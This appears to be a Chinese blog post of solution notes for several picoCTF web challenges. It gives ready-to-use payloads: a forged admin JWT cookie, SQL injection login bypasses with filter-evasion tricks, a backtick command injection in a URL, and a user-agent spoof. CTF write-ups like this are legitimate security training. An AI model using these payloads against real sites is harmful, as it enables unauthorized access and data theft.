---
title: picoCTF平台学习及使用
date: 2022-10-04 20:07:16
permalink: /pages/2362e9/
categories:
  - skill
  - tool
tags:
  - 
author: 
  name: JavaInterview.cn
  link: https://JavaInterview.cn
titleTag: Java
---

## 地址

    https://play.picoctf.org/practice

![](../../../media/pictures/skill/picoctf.png)

## 试题举例

列题举例：

一、JaWT Scratchpad	
    
    curl "https://jupiter.challenges.picoctf.org/problem/63090/"  -H "Content-Type: application/x-www-form-urlencoded"  --data "user=admin" -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1NzA5Njg2NDB9.77pnOGlEdwL7MtxHHS6ZKYD5z1O8w_-SFnzPGyNo9t8" -s | grep pico

二、Irish-Name-Repo 1
    
    curl "https://jupiter.challenges.picoctf.org/problem/33850/login.php" --data "username=admin'--&password=1" && echo

三、caas
    
    https://caas.mars.picoctf.net/cowsay/%60cat%20falg.txt%60


四、picobrowser

    curl --user-agent "picobrowser" "https://jupiter.challenges.picoctf.org/problem/26704/flag"

五、Client-side-again

    查看源代码拼装结果

六、dont-use-client-side

    根据规则拼装


七、web-gauntlet

    Round 1
    Filter: or
    Username: admin' --
    Password: 123
    Actual Query: SELECT * FROM users WHERE username='admin' -- AND password='123'
    
    Round 2
    Filter: or and = like --
    Username: admin' union select * from users where '1
    Password: 123
    Actual Query: SELECT * FROM users WHERE username='admin' union select * from users where '1' AND password='123'
    
    Round 3
    Filter: or and = like > < --
    Username: admin';
    Password: 123
    Actual Query: SELECT * FROM users WHERE username='admin';' AND password='123'
    
    Round 4
    Filter: or and = like > < -- admin
    Username: ad'||'min';
    Password: 123
    Actual Query: SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
    
    Round 5
    Filter: or and = like > < -- union admin
    Username: ad'||'min';
    Password: 123
    Actual Query: SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
    Flag
    All rounds have been passed, the page of round 6 says "Congrats! You won! Check out filter.php". Refresh filter.php again it shows the source code of filter.php and flag is at the end of the page.




## 总结
从picoctf平台中的思考

1.	查看源代码的方法
2.	根据规则拼装的方法
3.	Curl命令请求的方法
4.	Sql注入的方法
5.	谷歌百度的方法
6.	平时学英语的方法
7.	GitHub的方法
8.	年代及Tag的方法
9.	主次优先的方法
10.	懂得取舍的方法
11.	循序渐进的方法
12.	模拟环境的方法




